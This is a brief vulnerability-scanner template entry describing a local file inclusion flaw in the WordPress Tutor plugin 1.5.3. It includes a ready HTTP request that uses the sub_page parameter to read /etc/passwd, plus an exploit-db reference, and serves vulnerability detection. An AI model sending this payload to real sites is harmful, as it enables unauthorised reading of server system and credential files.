# Nuclei Template: WordPress tutor 1.5.3 - Local File Inclusion
**Template ID:** wp-tutor-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-tutor-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress tutor.1.5.3 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd
```

## References
- https://www.exploit-db.com/exploits/48058
